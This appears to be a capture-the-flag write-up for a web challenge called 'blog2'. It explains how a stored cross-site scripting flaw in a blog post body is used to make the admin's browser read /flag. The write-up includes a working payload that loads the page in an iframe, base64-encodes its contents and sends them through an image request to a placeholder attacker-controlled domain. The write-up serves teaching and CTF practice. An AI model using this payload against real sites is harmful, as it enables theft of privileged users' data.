# blog2
Author: rvino
## Description
```
`/flag`

```

When you register an account, you quickly discover that you are not allowed to read the flag without being an admin.
This means we either have to become the admin, trick the admin into giving us the flag.

By testing the blog posting form, we quickly find that the body is injectable. We check the cookies and realize that they are HttpOnly, and thus we cannot steal the admin's cookie.

We can however trick the admin into reading the `/flag` contents and send it to us. We can either use fetch to get the content, or we can use and iframe. I will show the the old school iframe variant.

Body:

```
<iframe id="ifr" src="/flag"></iframe>
<script>
setTimeout(function() {
    var data = document.getElementById('ifr').contentDocument.body.innerHTML;
    var img = new Image();
    img.src = "//<attack-controlled-domain>/?data=" + btoa(data);
}, 2000)
</script>
```
We inject an iframe pointing to the flag. We use a setTimeout with 2 seconds, to delay the execution of the script untill the iframe has hopefully loaded. We then grab the contents, base64 encode it with `btoa` (Binary-TO-Ascii) and send it to a host we control. When solving this, Burp Collaborator was used as the attacker controlled domain.
